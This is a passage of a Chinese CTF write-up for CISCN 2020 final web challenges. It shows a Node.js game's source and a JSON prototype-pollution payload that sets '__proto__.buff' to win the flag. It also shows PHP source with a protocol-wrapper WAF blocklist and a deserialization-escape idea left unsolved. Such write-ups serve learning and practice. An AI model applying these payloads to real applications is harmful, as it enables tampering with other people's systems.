punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/battle'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> player<span class="token punctuation">.</span>HP <span class="token operator">!==</span> <span class="token number">100</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"Forbidden"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">}</span>    <span class="token keyword">let</span> battleLog <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">let</span> round <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">do</span> <span class="token punctuation">{</span>        battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`&lt;font color="red" size="5px">Round &lt;B></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>round<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B> fight!&lt;/font>`</span></span><span class="token punctuation">)</span>        player<span class="token punctuation">.</span>aggressivity <span class="token operator">=</span> <span class="token function">getPlayerAggressivity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">playerAndMonsterInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">玩家&lt;B></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B>攻击力为&lt;B></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">getPlayerDamageValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B>!`</span></span><span class="token punctuation">)</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token function">playerUseItem</span><span class="token punctuation">(</span>round<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>                battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`玩家&lt;B></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B>使用了物品&lt;B>治疗药膏&lt;/B>! 玩家生命值+10！`</span></span><span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>                battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`玩家&lt;B></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B>使用了物品&lt;B>白银之锋&lt;/B>! 即将造成130%暴击！`</span></span><span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>                battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`玩家&lt;B></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B>使用了物品&lt;B>邪恶镰刀&lt;/B>! &lt;B>地穴领主&lt;/B>的攻击力变为了80%！`</span></span><span class="token punctuation">)</span>                <span class="token keyword">break</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>round <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token function">triggerPassiveSkill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>                    battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`玩家&lt;B></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B>触发了&lt;B>战神领主&lt;/B>的被动技能&lt;B>旋风飞斧&lt;/B>! 下次攻击的攻击力+5！`</span></span><span class="token punctuation">)</span>                    <span class="token keyword">break</span>                <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>                    battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`玩家&lt;B></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B>触发了&lt;B>奥术祭司&lt;/B>的被动技能&lt;B>巫毒恢复&lt;/B>! 玩家&lt;B></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B>的生命值+10！`</span></span><span class="token punctuation">)</span>                    <span class="token keyword">break</span>                <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>                    battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`玩家&lt;B></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B>触发了&lt;B>暗夜游侠&lt;/B>的被动技能&lt;B>百步穿杨&lt;/B>! 下次攻击的攻击力+7！`</span></span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">playerAttackMonster</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`玩家&lt;B></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B>攻击了&lt;B>地穴领主&lt;/B>并造成&lt;B></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">getPlayerDamageValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B>点伤害! &lt;B>地穴领主&lt;/B>剩余血量为&lt;B></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>monster<span class="token punctuation">.</span>HP<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B>`</span></span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>monster<span class="token punctuation">.</span>HP <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">monsterPassiveSkill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`&lt;B>地穴领主&lt;/B>触发了被动技能&lt;B>缩地&lt;/B>！生命值回复20点！回复后生命值为&lt;B></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>monster<span class="token punctuation">.</span>HP<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B>`</span></span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`&lt;B>地穴领主&lt;/B>攻击了玩家&lt;B></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B>并造成&lt;B></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">monsterAttackPlayer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B>点伤害! 玩家&lt;B></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B>剩余血量为&lt;B></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span>HP<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B>`</span></span><span class="token punctuation">)</span>        monster<span class="token punctuation">.</span>aggressivity <span class="token operator">=</span> <span class="token number">40</span><span class="token punctuation">;</span>        monster<span class="token punctuation">.</span>buff <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        player<span class="token punctuation">.</span>buff <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        round<span class="token operator">++</span>        battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>player<span class="token punctuation">.</span>HP <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> monster<span class="token punctuation">.</span>HP <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>player<span class="token punctuation">.</span>HP <span class="token operator">></span> monster<span class="token punctuation">.</span>HP<span class="token punctuation">)</span> <span class="token punctuation">{</span>        battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">"恭喜你胜利了！这是给你的奖励："</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">"很遗憾，你被打败了，但是不要灰心，再接再厉"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    player <span class="token operator">=</span> monster <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">"result_5be4038eaf61b1b7abad92cfece05cd7"</span> <span class="token punctuation">:</span> battleLog<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"&lt;br />\n"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>出 flag 需要 <strong>player.HP &gt; monster.HP</strong>，但不能直接改 player.HP。</p><p>不过可以<strong>加大 buff</strong>，再看源码中这一部分。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token keyword">let</span> i <span class="token keyword">in</span> tempPlayer <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>player<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token string">'career'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>careers<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token string">'item'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>items<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token string">'round_to_use'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">checkRound</span><span class="token punctuation">(</span>tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">continue</span>        <span class="token punctuation">}</span>        player<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>这里把接收到的 tempPlayer 这个 object 中的 value 不为空内容都赋给 player 了。</p><p>于是我们可以通过污染原型链，把 buff 改大。</p><blockquote><p>大师傅有言：</p><p>原型污染，虽然不能污染到真正的原型，但是可以替换 player 对象的原型到我们的恶意对象，将 buff 搞成一个特别大的值就能秒杀 boss。</p></blockquote><p><strong>Payload:</strong></p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"asdasd"</span><span class="token punctuation">,</span>    <span class="token property">"round_to_use"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>    <span class="token property">"career"</span><span class="token operator">:</span> <span class="token string">"high_priest"</span><span class="token punctuation">,</span>    <span class="token property">"item"</span><span class="token operator">:</span> <span class="token string">"ZLYG"</span><span class="token punctuation">,</span>    <span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"buff"</span><span class="token operator">:</span> <span class="token number">1000</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="/2020/10/06/CTF_2020CISCN_final/image-20201006153154041.png" alt="battle"></p><h3 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h3><p><strong>反序列化逃逸</strong></p><p>lib.php 部分源码 User 类</p><pre class=" language-php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$waf</span> <span class="token operator">=</span> <span class="token string">'/phar|file|gopher|http|sftp|flag/i'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$waf</span><span class="token punctuation">,</span> <span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">check_data</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span> <span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">check_data</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$value</span> <span class="token keyword">instanceof</span> <span class="token class-name">User</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$data_avatar</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_avatar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$data_avatar</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$data_avatar</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token constant">__DIR__</span> <span class="token punctuation">.</span> <span class="token string">"/"</span> <span class="token punctuation">.</span> <span class="token variable">$data_avatar</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$png_header</span> <span class="token operator">=</span> <span class="token string">"\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52"</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$png_header</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span> <span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">"png content got an unexpected Exception"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">"old_password"</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">"old_real_password"</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">check_data</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">"age"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">email</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">"email"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//......</span><span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">email</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">avatar</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">avatar</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">avatar</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\:\/\//'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">avatar</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token constant">__DIR__</span> <span class="token punctuation">.</span> <span class="token string">"/"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">avatar</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string">"&lt;script>\nvar img = document.createElement(\"img\");\nimg.src= \"data:image/png;base64,content\";\nimg.alt = \"user\";\ndocument.getElementById(\"pro-avatar\").append(img);\n&lt;/script>"</span><span class="token punctuation">;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>dashboard.php 部分源码</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"old_password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"update_password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"update_age"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"update_email"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"old_password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"update_password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"update_age"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"update_email"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[^\d]/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"update_age"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"update_email"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_EMAIL</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"update_password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">16</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\W/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"update_password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">alertMes</span><span class="token punctuation">(</span><span class="token string">"invalid information"</span><span class="token punctuation">,</span> <span class="token string">"./dashboard.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$update_profile</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span>        <span class="token string">"old_password"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"old_password"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"old_real_password"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">,</span>        <span class="token string">"password"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"update_password"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"age"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"update_age"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"email"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"update_email"</span><span class="token punctuation">]</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$update_profile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>应该是调用<code>User</code>类的<code>update</code>方法时经过 <code>waf</code> 和 <code>unserialize</code> 时存在反序列化漏洞。</p><p>大老鼠有言：</p><blockquote><p>waf() 造成序列化的字符串长度改变，就可以提前截断了</p><p>逃逸出来一个user对象就行了</p><p><img src="/2020/10/06/CTF_2020CISCN_final/image-20201006032749565.png" alt=""></p></blockquote><p>u1s1，PHP 是世界上最好的语言，这题后面再看看来复现8<em>（咕咕咕</em></p><p><em>（先溜了喵</em></p><script>        document.querySelectorAll('.github-emoji')          